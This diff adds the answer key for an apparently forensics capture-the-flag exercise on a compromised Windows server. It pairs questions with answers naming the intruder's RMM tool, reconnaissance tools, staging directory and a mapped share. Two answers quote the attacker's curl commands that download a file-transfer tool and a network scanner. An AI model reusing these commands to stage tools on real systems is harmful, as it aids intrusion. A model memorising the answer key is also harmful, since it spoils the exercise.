@@ -1,0 +1,16 @@
+q01.txt	Windows Server 2022 Datacenter	What Operating System was the victim machine running?
+q02.txt	2025-06-18T01:41:25	When was the Operating System Installed (in ISO 8601 Format)?
+q03.txt	UTC	What is the Time Zone (TimeZoneKeyName)?
+q04.txt	NAMTWS005	What was the Victim's Host Name?
+q05.txt	TeamViewer	What RMM tool did the Threat Actor use?
+q06.txt	TeamViewerQS_x64.exe	What was the executable file name of the RMM Program?
+q07.txt	AngryIPScanner.exe	What is the executable file name of the IP Scanner the Threat Actor attempted to use?
+q08.txt	AdFind.exe	Which Active Directory reconnaissance tool did the threat actor attempt to use in this environment?
+q09.txt	7za920.zip	What was the file name of the zip tool that was downloaded?
+q10.txt	HackTool:Win32/AdFind!MSR	If Defender detected a Hacking tool, what was the detection Threat Name (Otherwise put: None)?
+q11.txt	C:\Temp	What directory did the Threat Actor put their tools in?
+q12.txt	cmd /c curl -L https://winscp.net/download/WinSCP-6.5.1-Portable.zip/download --output winscp.zip	What was the command used to download the file transfer program?
+q13.txt	cmd /c curl -L https://github.com/angryip/ipscan/releases/download/3.9.1/ipscan-3.9.1-setup.exe --output AngryIPScanner.exe	What was the command used to download the network scanning program?
+q14.txt	C:\Temp\Recon.txt	What is the full path and filename where the TA stored their recon data?
+q15.txt	net use z: \\namtsh01\common	What command did the TA use to map to a server (enter: none if they did not)?
+q16.txt	Gloria M. Bradley	Were any other domain users found on the compromised asset? If so, the flag should be the users First, Middle, and Last name if known, otherwise use `none`. For example, `btv{Douglas Q. Funny}`, `btv{Sherman Charles Zeroday}`
